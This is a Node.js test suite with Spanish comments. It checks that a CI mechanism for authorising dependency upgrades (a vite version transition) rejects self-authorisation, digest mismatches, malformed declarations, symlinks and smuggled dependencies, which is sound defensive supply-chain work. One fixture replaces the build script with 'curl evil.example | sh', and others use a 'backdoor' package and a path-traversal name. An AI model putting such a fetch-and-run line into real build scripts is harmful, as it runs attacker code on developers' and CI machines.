#!/usr/bin/env node
/* =========================================================
   Onion Support · A01 · la transición falla cerrada

   Este contrato no comprueba que la transición FUNCIONE. Comprueba que NO
   funciona en todos los casos en los que no debe, que es lo único que hace
   segura una excepción a la igualdad de bytes.

   El caso feliz vale un bloque. Los otros dieciocho son el contrato.

   Cada bloque construye un mundo real en disco --base y candidato-- y ejecuta
   el mismo código que ejecuta la CI. No hay dobles del resolutor.
========================================================= */

import assert from "node:assert/strict";
import { existsSync, mkdtempSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { resolve } from "node:path";

import { stageTrustedBuild } from "./stage-trusted-build.mjs";
import { parseDeclaration, resolveToolchainSource, sha256 } from "./toolchain-transition.mjs";

const FROM = "8.2.2";
const TO = "8.3.0";
const PKG = "vite";

let passed = 0;
async function bloque(nombre, ejecutar) {
  await ejecutar();
  passed += 1;
  console.log(`PASS ${String(passed).padStart(2)} · ${nombre}`);
}

/* Falla si el mensaje no nombra la causa: un rechazo que no se explica obliga a
   leer el código fuente para entender por qué la PR está roja. */
function rechaza(ejecutar, fragmento, nombre) {
  assert.throws(ejecutar, (error) => {
    assert.ok(error instanceof Error, `${nombre}: debe lanzar Error`);
    assert.match(error.message, /^A01:/u, `${nombre}: el mensaje debe declarar A01, no filtrarse desde otra capa`);
    assert.ok(
      error.message.includes(fragmento),
      `${nombre}: el mensaje debe nombrar «${fragmento}»; recibido: ${error.message}`
    );
    return true;
  }, `${nombre}: se esperaba un rechazo`);
}

const raices = [];
function nuevaRaiz() {
  const dir = mkdtempSync(resolve(tmpdir(), "onion-a01-"));
  raices.push(dir);
  return dir;
}

const manifiesto = (version, extra = {}) => JSON.stringify({
  name: "onionsupport-frontend",
  version: "1.0.0",
  scripts: { build: "vite build" },
  devDependencies: { "playwright-core": "1.63.0", [PKG]: version, ...extra },
}, null, 2) + "\n";

const lock = (version, extra = {}) => JSON.stringify({
  name: "onionsupport-frontend",
  lockfileVersion: 3,
  packages: {
    "": { name: "onionsupport-frontend", devDependencies: { [PKG]: version } },
    [`node_modules/${PKG}`]: { version, resolved: `https://registry.npmjs.org/${PKG}/-/${PKG}-${version}.tgz`, dev: true },
    ...extra,
  },
}, null, 2) + "\n";

function escribirArbol(raiz, { manifest, lockfile, viteConfig = "export default {}\n", declaracion, herramienta = "// tool\n" }) {
  writeFileSync(resolve(raiz, "package.json"), manifest);
  writeFileSync(resolve(raiz, "package-lock.json"), lockfile);
  writeFileSync(resolve(raiz, "vite.config.js"), viteConfig);
  mkdirSync(resolve(raiz, "tools"), { recursive: true });
  writeFileSync(resolve(raiz, "tools", "alguna-herramienta.mjs"), herramienta);
  if (declaracion !== undefined) {
    writeFileSync(resolve(raiz, "tools", "toolchain-transition.json"), declaracion);
  }
  return raiz;
}

const declarar = (campos = {}) => JSON.stringify({
  schema: "onionsupport.toolchain-transition.v1",
  package: PKG,
  from: FROM,
  to: TO,
  packageJsonSha256: sha256(Buffer.from(manifiesto(TO))),
  packageLockSha256: sha256(Buffer.from(lock(TO))),
  ...campos,
}, null, 2) + "\n";

/* Base en `from`, candidato con el toolchain exacto que la declaración ata. */
function mundo({ declaracion = declarar(), candidato = {} } = {}) {
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM), declaracion });
  const cand = escribirArbol(nuevaRaiz(), {
    manifest: candidato.manifest ?? manifiesto(TO),
    lockfile: candidato.lockfile ?? lock(TO),
    viteConfig: candidato.viteConfig,
    declaracion: candidato.declaracion,
  });
  return { base, cand };
}

const resolver = (base, cand) => resolveToolchainSource({ trustedRoot: base, candidateRoot: cand });

/* ───────────────────── 1 · sin declaración: modo estricto ───────────────────── */
await bloque("sin declaración, el toolchain sale de la base y no se lee nada más", () => {
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM) });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(TO), lockfile: lock(TO) });
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "base");
  assert.equal(resultado.declaration, null);

  /* Y sin declaración ni siquiera hacen falta archivos legibles: el camino
     estricto corta antes de mirarlos. Esto es lo que mantiene verdes las
     regresiones que ya existían con fixtures que no son JSON. */
  const basura = escribirArbol(nuevaRaiz(), { manifest: "no soy json\n", lockfile: "tampoco\n" });
  assert.equal(resolver(basura, basura).source, "base");
});

/* ───────────────────── 2 · la transición exacta se autoriza ───────────────────── */
await bloque("la transición declarada, byte a byte, autoriza el toolchain del candidato", () => {
  const { base, cand } = mundo();
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "candidate");
  assert.equal(resultado.declaration.package, PKG);
  assert.equal(resultado.declaration.from, FROM);
  assert.equal(resultado.declaration.to, TO);
  assert.match(resultado.reason, /autorizada por la base/u);
});

/* ───────────────────── 3 · versión de destino equivocada ───────────────────── */
await bloque("un candidato que salta a otra versión no está autorizado", () => {
  const { base, cand } = mundo({ candidato: { manifest: manifiesto("8.4.0"), lockfile: lock("8.4.0") } });
  rechaza(() => resolver(base, cand), "no coincide con ninguna transición autorizada", "destino equivocado");
});

/* ───────────────────── 4 · un byte del lock ───────────────────── */
await bloque("un solo byte distinto en el lockfile invalida la autorización", () => {
  const { base, cand } = mundo({ candidato: { lockfile: lock(TO).replace(/\n$/u, "\n\n") } });
  rechaza(() => resolver(base, cand), "sólo uno de los dos archivos coincide", "un byte del lock");
});

/* ───────────────────── 5 · dependencia añadida ───────────────────── */
await bloque("añadir una dependencia rompe los dos digests", () => {
  const { base, cand } = mundo({
    candidato: {
      manifest: manifiesto(TO, { "left-pad": "1.3.0" }),
      lockfile: lock(TO, { "node_modules/left-pad": { version: "1.3.0", dev: true } }),
    },
  });
  rechaza(() => resolver(base, cand), "no coincide con ninguna transición autorizada", "dependencia añadida");
});

/* ───────────────────── 6 · otra dependencia actualizada de paso ───────────────────── */
await bloque("colar otra actualización junto a la autorizada falla", () => {
  const manifest = manifiesto(TO).replace('"playwright-core": "1.63.0"', '"playwright-core": "1.64.0"');
  const lockfile = lock(TO, { "node_modules/playwright-core": { version: "1.64.0", dev: true } });
  const { base, cand } = mundo({ candidato: { manifest, lockfile } });
  rechaza(() => resolver(base, cand), "no coincide con ninguna transición autorizada", "polizón");
});

/* ───────────────────── 7 · el candidato NO se autoriza a sí mismo ───────────────────── */
await bloque("una declaración escrita por el candidato no le da ninguna autoridad", () => {
  /* La base no declara nada. El candidato escribe la declaración perfecta para
     su propio toolchain --y además se autoriza un salto que la base no conoce. */
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM) });
  const cand = escribirArbol(nuevaRaiz(), {
    manifest: manifiesto(TO), lockfile: lock(TO), declaracion: declarar(),
  });
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "base", "la declaración del candidato no se lee jamás");
  assert.equal(resultado.declaration, null);

  /* Y si la base SÍ declara, la del candidato sigue sin contar: la que manda es
     la de la base, aunque el candidato traiga otra que se contradiga. */
  const otra = mundo({ candidato: { declaracion: declarar({ to: "9.9.9" }) } });
  assert.equal(resolver(otra.base, otra.cand).declaration.to, TO);
});

/* ───────────────────── 8 · tools/ del candidato sigue sin ser confiable ───────────────────── */
await bloque("tools/ se pone en escena desde la base, con transición autorizada o sin ella", async () => {
  const { base, cand } = mundo();
  escribirArbol(base, { manifest: manifiesto(FROM), lockfile: lock(FROM), declaracion: declarar(), herramienta: "// base\n" });
  escribirArbol(cand, { manifest: manifiesto(TO), lockfile: lock(TO), herramienta: "// CANDIDATO MALICIOSO\n" });
  for (const archivo of ["index.html", "login.html", "staticwebapp.config.json", "site.webmanifest",
    "robots.txt", "sitemap.xml", "favicon.ico", "ad1f6102f1914986b540f6a34bf6939b.txt"]) {
    writeFileSync(resolve(cand, archivo), "dato\n");
  }
  mkdirSync(resolve(cand, "seo"), { recursive: true });
  for (const pagina of ["reparacion-ordenadores", "soporte-informatico", "redes-wifi", "impresoras", "soporte-empresas"]) {
    writeFileSync(resolve(cand, "seo", `${pagina}.html`), "<html></html>\n");
  }
  mkdirSync(resolve(cand, "src"), { recursive: true });
  writeFileSync(resolve(cand, "src", "main.js"), "export const x = 1;\n");

  const destino = resolve(nuevaRaiz(), "staged");
  const puesta = await stageTrustedBuild({ trustedSource: base, candidateSource: cand, destination: destino });

  assert.equal(puesta.toolchain.source, "candidate", "la transición autorizada sí se aplica");
  assert.equal(readFileSync(resolve(destino, "tools", "alguna-herramienta.mjs"), "utf8"), "// base\n",
    "tools/ NUNCA sale del candidato");
  assert.equal(readFileSync(resolve(destino, "package.json"), "utf8"), manifiesto(TO),
    "el package.json autorizado sí sale del candidato");
});

/* ───────────────────── 9 · vite.config.js nunca sale del candidato ───────────────────── */
await bloque("vite.config.js sigue viniendo de la base incluso durante una transición", async () => {
  const { base, cand } = mundo({ candidato: { viteConfig: "export default { MALICIOSO: true }\n" } });
  for (const archivo of ["index.html", "login.html", "staticwebapp.config.json", "site.webmanifest",
    "robots.txt", "sitemap.xml", "favicon.ico", "ad1f6102f1914986b540f6a34bf6939b.txt"]) {
    writeFileSync(resolve(cand, archivo), "dato\n");
  }
  mkdirSync(resolve(cand, "seo"), { recursive: true });
  for (const pagina of ["reparacion-ordenadores", "soporte-informatico", "redes-wifi", "impresoras", "soporte-empresas"]) {
    writeFileSync(resolve(cand, "seo", `${pagina}.html`), "<html></html>\n");
  }
  mkdirSync(resolve(cand, "src"), { recursive: true });
  writeFileSync(resolve(cand, "src", "main.js"), "export const x = 1;\n");

  const destino = resolve(nuevaRaiz(), "staged");
  await stageTrustedBuild({ trustedSource: base, candidateSource: cand, destination: destino });
  assert.equal(readFileSync(resolve(destino, "vite.config.js"), "utf8"), "export default {}\n");
});

/* ───────────────────── 10 · la declaración miente sobre su propio contenido ───────────────────── */
await bloque("si el par autorizado no contiene la versión declarada, se rechaza", () => {
  /* Digests coherentes con archivos que declaran 8.5.0 mientras la declaración
     dice 8.3.0: quien autorizó no leyó lo que estaba autorizando. */
  const manifest = manifiesto("8.5.0");
  const lockfile = lock("8.5.0");
  const declaracion = declarar({
    packageJsonSha256: sha256(Buffer.from(manifest)),
    packageLockSha256: sha256(Buffer.from(lockfile)),
  });
  const { base, cand } = mundo({ declaracion, candidato: { manifest, lockfile } });
  rechaza(() => resolver(base, cand), "vite 8.2.2 -> 8.5.0", "declaración incoherente");
});

await bloque("si el lockfile autorizado resuelve otra versión que su package.json, se rechaza", () => {
  const manifest = manifiesto(TO);
  const lockfile = lock("8.9.9");
  const declaracion = declarar({
    packageJsonSha256: sha256(Buffer.from(manifest)),
    packageLockSha256: sha256(Buffer.from(lockfile)),
  });
  const { base, cand } = mundo({ declaracion, candidato: { manifest, lockfile } });
  rechaza(() => resolver(base, cand), "el lockfile autorizado resuelve 8.9.9", "lock incoherente");
});

/* ───────────────────── 11 · declaraciones malformadas ───────────────────── */
await bloque("toda declaración malformada se rechaza, ninguna degrada a modo permisivo", () => {
  const casos = [
    ["{ no json", "no es JSON válido"],
    ["[]", "debe ser un objeto JSON"],
    ["null", "debe ser un objeto JSON"],
    [JSON.stringify({ schema: "otro.v9", package: PKG, from: FROM, to: TO, packageJsonSha256: "a".repeat(64), packageLockSha256: "b".repeat(64) }), "schema desconocido"],
    [JSON.stringify({ schema: "onionsupport.toolchain-transition.v1", package: PKG, from: FROM, to: TO, packageJsonSha256: "a".repeat(64) }), "claves inesperadas"],
    [declarar({ extra: 1 }), "claves inesperadas"],
    [declarar({ package: "../../etc/passwd" }), "nombre de paquete inválido"],
    [declarar({ to: "^8.3.0" }), "versión exacta"],
    [declarar({ to: "latest" }), "versión exacta"],
    [declarar({ from: FROM, to: FROM }), "a sí misma"],
    [declarar({ packageJsonSha256: "corto" }), "sha256 hexadecimal"],
    [declarar({ packageJsonSha256: "A".repeat(64) }), "sha256 hexadecimal"],
    [declarar({ packageLockSha256: sha256(Buffer.from(manifiesto(TO))) }), "no pueden ser el mismo archivo"],
  ];
  for (const [texto, fragmento] of casos) {
    rechaza(() => parseDeclaration(Buffer.from(texto)), fragmento, `malformada: ${fragmento}`);
  }
  assert.equal(casos.length, 13);
});

/* ───────────────────── 12 · caducidad por contenido ───────────────────── */
await bloque("una declaración consumida deja de autorizar y vuelve a modo estricto", () => {
  /* La activación ya se fusionó: la base declara 8.3.0. La declaración puede
     seguir ahí hasta T4, pero ya no autoriza nada y tampoco puede congelar el
     repositorio: cualquier PR normal vuelve a usar el toolchain de la base. */
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(TO), lockfile: lock(TO), declaracion: declarar() });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(TO), lockfile: lock(TO) });
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "base");
  assert.match(resultado.reason, /modo estricto/u);

  /* Una base en una tercera versión no es una transición consumida: la
     declaración ya no describe la realidad y se rechaza cerradamente. */
  const ajena = escribirArbol(nuevaRaiz(), { manifest: manifiesto("8.4.0"), lockfile: lock("8.4.0"), declaracion: declarar() });
  rechaza(() => resolver(ajena, cand), "declaración equivocada", "base fuera de from/to");
});

/* ───────────────────── 13 · una declaración no autoriza otro paquete ───────────────────── */
await bloque("una declaración para un paquete no autoriza el salto de otro", () => {
  /* La base dice autorizar playwright-core, pero sus digests apuntan a un par
     de archivos que mueven vite. El nombre de la declaración TIENE que mandar:
     si no, el texto que el revisor lee al fusionar no describe lo que autoriza. */
  const declaracion = declarar({ package: "playwright-core", from: "1.63.0", to: "1.64.0" });
  const { base, cand } = mundo({ declaracion });
  rechaza(() => resolver(base, cand), "mueve dependencias que no declara", "paquete cruzado");

  /* Y una declaración cuyo paquete no está en el package.json de la base no
     puede siquiera evaluarse. */
  const huerfana = declarar({ package: "paquete-inexistente", from: FROM, to: TO });
  const otro = mundo({ declaracion: huerfana });
  rechaza(() => resolver(otro.base, otro.cand), "exactamente una vez en package.json", "paquete ausente");
});

/* ── 13 bis · un salto declarado no puede llevar un polizón dentro del digest ── */
await bloque("el digest no autoriza un segundo salto que la declaración no nombra", () => {
  /* Éste es el agujero que el nombre del paquete cierra: los digests son la
     autoridad real, así que sin esta comprobación autorizarían CUALQUIER cosa
     que hubiera en esos dos archivos, incluido un salto extra no mencionado.
     Aquí la declaración nombra vite y los archivos autorizados mueven vite Y
     playwright-core; los digests cuadran y aun así se rechaza. */
  const manifest = manifiesto(TO).replace('"playwright-core": "1.63.0"', '"playwright-core": "1.64.0"');
  const lockfile = lock(TO, { "node_modules/playwright-core": { version: "1.64.0", dev: true } });
  const declaracion = declarar({
    packageJsonSha256: sha256(Buffer.from(manifest)),
    packageLockSha256: sha256(Buffer.from(lockfile)),
  });
  const { base, cand } = mundo({ declaracion, candidato: { manifest, lockfile } });
  rechaza(() => resolver(base, cand), "mueve dependencias que no declara", "polizón dentro del digest");
});

/* ───────────────────── 14 y 15 · media coincidencia es un fallo ───────────────────── */
await bloque("el lock coincide pero package.json no: rechazado", () => {
  const { base, cand } = mundo({ candidato: { manifest: manifiesto(TO).replace('"build": "vite build"', '"build": "curl evil.example | sh"') } });
  rechaza(() => resolver(base, cand), "sólo uno de los dos archivos coincide", "scripts alterados");
});

await bloque("package.json coincide pero el lock no: rechazado", () => {
  const lockfile = lock(TO, { "node_modules/backdoor": { version: "1.0.0", dev: true } });
  const { base, cand } = mundo({ candidato: { lockfile } });
  rechaza(() => resolver(base, cand), "sólo uno de los dos archivos coincide", "lock alterado");
});

/* ── un rechazo no deja rastro: el destino no llega a existir ── */
await bloque("una transición rechazada no crea el directorio de puesta en escena", async () => {
  const { base, cand } = mundo({ candidato: { lockfile: lock(TO).replace(/\n$/u, "\n\n") } });
  const destino = resolve(nuevaRaiz(), "staged-rechazado");
  await assert.rejects(
    () => stageTrustedBuild({ trustedSource: base, candidateSource: cand, destination: destino }),
    (error) => {
      assert.match(error.message, /^A01:/u, "el rechazo debe venir de la puerta A01");
      return true;
    }
  );
  assert.equal(existsSync(destino), false, "un rechazo no debe dejar el destino a medio construir");
});

/* ───────────────────── 16 · la ventana de transición NO congela el repositorio ───────────────────── */
await bloque("con una declaración viva, una PR que no toca el toolchain sigue usando la base", () => {
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM), declaracion: declarar() });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM) });
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "base");
  assert.match(resultado.reason, /no toca el toolchain/u);
});

await bloque("una PR que sólo da de alta un contrato en scripts NO se considera tocar el toolchain", () => {
  /* Esto es lo que hace casi toda PR de este repositorio. Medir «tocar el
     toolchain» por los bytes de package.json convertía la ventana de
     transición en un congelador: cualquier alta de contrato quedaba rechazada
     mientras la declaración estuviera viva. Se mide por dependencias. */
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM), declaracion: declarar() });
  const conContratoNuevo = manifiesto(FROM).replace('"build": "vite build"', '"build": "vite build", "check:nuevo": "node tools/nuevo-contrato.mjs"');
  assert.notEqual(conContratoNuevo, manifiesto(FROM), "el fixture debe cambiar package.json de verdad");
  const cand = escribirArbol(nuevaRaiz(), { manifest: conContratoNuevo, lockfile: lock(FROM) });
  const resultado = resolver(base, cand);
  assert.equal(resultado.source, "base");
  assert.match(resultado.reason, /no toca el toolchain/u);
});

await bloque("cambiar una dependencia sin regenerar el lock sí es tocar el toolchain, y se rechaza", () => {
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM), declaracion: declarar() });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM, { "left-pad": "1.3.0" }), lockfile: lock(FROM) });
  rechaza(() => resolver(base, cand), "no coincide con ninguna transición autorizada", "dependencia sin lock");
});

/* ───────────────────── 17 · la declaración no puede ser un enlace ───────────────────── */
await bloque("una declaración que es un symlink se rechaza en vez de seguirse", () => {
  const base = escribirArbol(nuevaRaiz(), { manifest: manifiesto(FROM), lockfile: lock(FROM) });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(TO), lockfile: lock(TO) });
  const fuera = resolve(nuevaRaiz(), "declaracion-ajena.json");
  writeFileSync(fuera, declarar());
  symlinkSync(fuera, resolve(base, "tools", "toolchain-transition.json"));
  rechaza(() => resolver(base, cand), "archivo regular", "declaración enlazada");
});

/* ───────────────────── 18 · tamaño acotado ───────────────────── */
await bloque("una declaración desmesurada se rechaza antes de parsearse", () => {
  const base = escribirArbol(nuevaRaiz(), {
    manifest: manifiesto(FROM), lockfile: lock(FROM),
    declaracion: declarar({ package: PKG }).replace(/\}\n$/u, `,"x":"${"y".repeat(2048)}"}\n`),
  });
  const cand = escribirArbol(nuevaRaiz(), { manifest: manifiesto(TO), lockfile: lock(TO) });
  rechaza(() => resolver(base, cand), "supera 1024 bytes", "declaración desmesurada");
});

/* ───────────────────── 19 · nadie puede pedir que el candidato se lea a sí mismo ───────────────────── */
await bloque("resolveToolchainSource exige las dos raíces y no adivina ninguna", () => {
  rechaza(() => resolveToolchainSource({}), "exige trustedRoot y candidateRoot", "sin raíces");
  rechaza(() => resolveToolchainSource({ trustedRoot: "/tmp" }), "exige trustedRoot y candidateRoot", "sin candidato");
  rechaza(() => resolveToolchainSource({ candidateRoot: "/tmp" }), "exige trustedRoot y candidateRoot", "sin base");
});

for (const raiz of raices) rmSync(raiz, { recursive: true, force: true });

console.log();
console.log(`A01 toolchain transition contract: PASS · ${passed} bloques · la excepción falla cerrada`);
console.log("- sin declaración en la base, el comportamiento es exactamente el de hoy");
console.log("- el candidato nunca se autoriza: su declaración no se lee jamás");
console.log("- package.json y package-lock.json se autorizan juntos y por digest exacto");
console.log("- vite.config.js y tools/ siguen viniendo siempre de la base");
console.log("- la autorización caduca sola cuando la base adopta la versión de destino");
